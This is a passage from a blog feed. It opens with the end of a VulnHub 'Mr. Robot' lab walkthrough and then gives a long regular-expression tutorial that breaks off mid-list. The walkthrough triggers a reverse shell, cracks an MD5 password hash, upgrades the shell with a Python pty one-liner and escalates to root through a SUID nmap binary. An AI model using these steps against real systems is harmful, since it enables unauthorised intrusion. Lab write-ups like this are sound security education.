&lt;p&gt;Execute the reverse shell by navigating to &lt;code&gt;http:&#x2F;&#x2F;192.168.123.104&#x2F;Image&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;A low privilege shell should now be accessible. From here, running the linenum and linuxprivchecker scripts for later review. After digging around a bit to understand what&#x27;s inside the system, &#x2F;home&#x2F;robot contains the 2&#x2F;3 loot key. There is a file with an MD5 hash of &lt;code&gt;822c73956184f694993bede3eb39f959&lt;&#x2F;code&gt;. Crackstation.net showed the decrypted password for &lt;code&gt;robot&lt;&#x2F;code&gt; login as &lt;code&gt;abcdefghijklmnopqrstuvwxyz&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;su&lt;&#x2F;code&gt; and login as &lt;code&gt;robot&lt;&#x2F;code&gt; login should now be accessible and 2&#x2F;3 loot key is now readable.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;vulnhub-mrrobot&#x2F;loot-2.png&quot; alt=&quot;loot-2.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Upgrade the shell to interactive shell.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;python -c &amp;quot;import pty;pty.spawn(&amp;#39;&#x2F;bin&#x2F;bash&amp;#39;)&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The linuxprivchecker script showed &lt;code&gt;nmap&lt;&#x2F;code&gt; with root permissions assigned along with sticky execution bit. This will allow us to exploit the nmap interactive shell to escalate our privileges as root.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;-rwsr-xr-x 1 root root 504736 Nov 13  2015 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;vulnhub-mrrobot&#x2F;rooted.png&quot; alt=&quot;rooted.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Regular Expression Tutorial</title>
        <published>2019-03-01T00:00:00+00:00</published>
        <updated>2019-03-01T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/tutorial-regex/" type="text/html"/>
        <id>https://johntuyen.com/posts/tutorial-regex/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.lynda.com&#x2F;Regular-Expressions-tutorials&quot;&gt;https:&#x2F;&#x2F;www.lynda.com&#x2F;Regular-Expressions-tutorials&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;1&quot;&gt;1&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;There are different types of RegEx engines that will behave slightly different than others.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;2&quot;&gt;2&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Literal characters&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Regular expressions are eager - important to keep in mind. It wants to return a match as fast as possible. Meta characters&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Characters with special meaning:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\ . * + - {} [] ^ $ | ? () : ! =
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;A wildcard match:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Escape the next character:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Escaping characters like this is generally used inside programming languages. Take note of the slash period.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;\9.00&#x2F; matches &amp;quot;9.00&amp;quot; but not &amp;quot;9500&amp;quot; or &amp;quot;9-00&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\&#x2F;home\&#x2F;user\&#x2F;document\&#x2F;text\.txt
&lt;&#x2F;span&gt;&lt;span&gt;```	
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Other special characters:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Tabs:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\t
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Line returns:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\r \n \r\n
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Non-printable characters. Not commonly used. Bell, escape, form feed, vertical tab:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\a \e \f \v
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;ASCII or ANSI Codes&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;3&quot;&gt;3&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Defining a character set&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Match any one of several characters but only one character&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This does not match &amp;quot;great&amp;quot;.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;gr[ea]t&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Character ranges&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Match zero to nine:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;[0-9]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Negative character sets&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Do not match character:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;^
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Matches any one non-vowel:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;[^aeiou]&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Matches &amp;quot;seek&amp;quot; and &amp;quot;sees&amp;quot; but not &amp;quot;seem&amp;quot; or &amp;quot;seen&amp;quot; or &amp;quot;see&amp;quot;. &amp;quot;See &amp;quot; is a match so be aware&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;see[^mn]&#x2F; 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Metacharacters inside character sets&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Metacharacters inside character sets are already escaped with the exception of &lt;code&gt;[ - ^&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Shorthand character sets&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Digit:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\d or [0-9]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Word character:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\w or [a-zA-Z0-9_]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Whitespace:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\s or [ \t\r\n]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Not digit:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\D or [^0-9]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Not word character:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\W or [^a-zA-Z0-9_]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Not whitespace:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\S or [^ \t\r\n]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;4&quot;&gt;4&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Repetition metacharacters&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Preceding item zero or more times:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;*
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Preceding item one or more times:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;+
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Preceding item zero or more times:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;?
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Repetition example 1:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;apples*&#x2F; matches &amp;quot;apple&amp;quot;, &amp;quot;apples&amp;quot;, and &amp;quot;applessssss&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Repetition example 2:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;apples+&#x2F; matches &amp;quot;apples&amp;quot; and &amp;quot;applessssss&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Repetition example 3:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;apples?&#x2F; matches &amp;quot;apple&amp;quot; and &amp;quot;apples&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Quantified repetition&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;min&lt;&#x2F;code&gt; must be included, &lt;code&gt;max&lt;&#x2F;code&gt; is optional:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;{min,max}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Matches numbers with 4 to 8 digits:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\d{4,8}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Matches numbers with exactly 4 digits:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\d{4}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Matches numbers with 4 or more digits:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\d{4,}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Greedy expressions&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Regular expressions are greedy - important to keep in mind.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Greedy strategy - match as much as possible before giving control to the next expression part&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Lazy expressions&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;*?, +?, {min,max}?, ??
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Lazy strategy - match as little as possible before giving control to the next expression part&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;\w*?\d{3}&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;[A-Za-z-]+?.&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;.{4-8}?_.{4,8}&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Using repetition efficiently&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Efficient matching + less backtracking = speedy results&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Define the quantity of repeated expressions&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;.+&#x2F;&lt;&#x2F;code&gt; is faster than &lt;code&gt;&#x2F;.*&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;.{5}&#x2F;&lt;&#x2F;code&gt; and &lt;code&gt;&#x2F;.{3,7}&#x2F;&lt;&#x2F;code&gt; are even faster&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Narrow the scope of the repeated expression&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#x2F;.+&#x2F;&lt;&#x2F;code&gt; can become &lt;code&gt;&#x2F;[A-Za-z]+&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Provide clearer starting and ending points&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#x2F;&amp;lt;.+&amp;gt;&#x2F;&lt;&#x2F;code&gt; can become &lt;code&gt;&#x2F;&amp;lt;[^&amp;gt;]+&amp;gt;&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;5-grouping-and-alternation&quot;&gt;5: Grouping and Alternation&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Grouping metacharacters&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Grouping&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;( )
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Apply repetition operators to a group&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Makes expressions easier to read&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Captures group for use in matching and replacing&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Cannot be used inside character set&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;(abc)+&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;abc&amp;quot; and &amp;quot;abcabcabc&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;(in)?dependent&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;independent&amp;quot; and &amp;quot;dependent&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Alternation metacharacter&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;OR operator:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;| -
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Match expression on left or right side&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Ordered, leftmost expression gets precedence. If first expression matches, it will stop searching.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Multiple choices can be daisy-chained&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;apple|orange&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;apple&amp;quot; and &amp;quot;orange&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;abc|def|ghi|jkl&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;abc&amp;quot;, &amp;quot;def&amp;quot;, &amp;quot;ghi&amp;quot;, and &amp;quot;jkl&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;w(ei|ie)rd&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;weird&amp;quot; and &amp;quot;wierd&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Writing local and efficient alternations&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;peanut(butter)?&lt;&#x2F;code&gt; matches &amp;quot;peanutbutter&amp;quot; and not peanut first because (butter) is greedy.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;(\w+|FY\d{4}_report.xls)&lt;&#x2F;code&gt; matches &amp;quot;FY2003_report.xls&amp;quot; using the first expression &lt;code&gt;w+&lt;&#x2F;code&gt; because it&#x27;s greedy. It doesn&#x27;t understand the second expression even though it&#x27;s more precise&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;xyz|abc|def|ghi&#x2F;&lt;&#x2F;code&gt; matches &amp;quot;abc&amp;quot; first and not &amp;quot;xyz&amp;quot; because it doesn&#x27;t scan the entire string. It will scan the first few characters first and see if it matches the first alternation&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Put simplest (most efficient) expression first&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#x2F;\w+_\d{2,4}|\d{4}_\d{2}_\w+|export\d{2}&#x2F;&lt;&#x2F;code&gt; (inefficent,backtrack) vs &lt;code&gt;&#x2F;export\d{2}|\d{4}_\d{2}_\w+|\w+_\d{2,4}&#x2F;&lt;&#x2F;code&gt; (efficient,simple)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Repeating and nesting alternations&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Nesting means when you have an expression that looks like &lt;code&gt;(apple(juice|sauce))&lt;&#x2F;code&gt; and not &lt;code&gt;(applejuice|applesauce)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Repeating alternations: first matched alternation does not affect the next matches meaning.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;(AA|BB|CC){6}&lt;&#x2F;code&gt; matches &amp;quot;AABBCCAABBCC&amp;quot;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;6-anchored-expressions&quot;&gt;6: Anchored Expressions&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Start and end anchors&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Reference a position, not an actual character&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Start of string&#x2F;line:&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;^
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;End of string&#x2F;line:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Start of string, never end of line (not supported by some programming languages):&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\A
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;End of string, never end of line (not supported by some programming languages):&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;\Z
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;^apple&#x2F; or &#x2F;\Aapple&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;apple$&#x2F; or &#x2F;apple\Z&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;^apple$&#x2F; or &#x2F;\Aapple\Z&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;If you have &lt;code&gt;^&lt;&#x2F;code&gt; and &lt;code&gt;$&lt;&#x2F;code&gt; in a single expression, it will have to match the whole string&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Line breaks and multiline mode&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&#x2F;[a-z]+&#x2F;&lt;&#x2F;code&gt; matches the first line on the list but does the next lines after it. This is due to being in single line mode&lt;&#x2F;p&gt;
&lt;ul&gt;
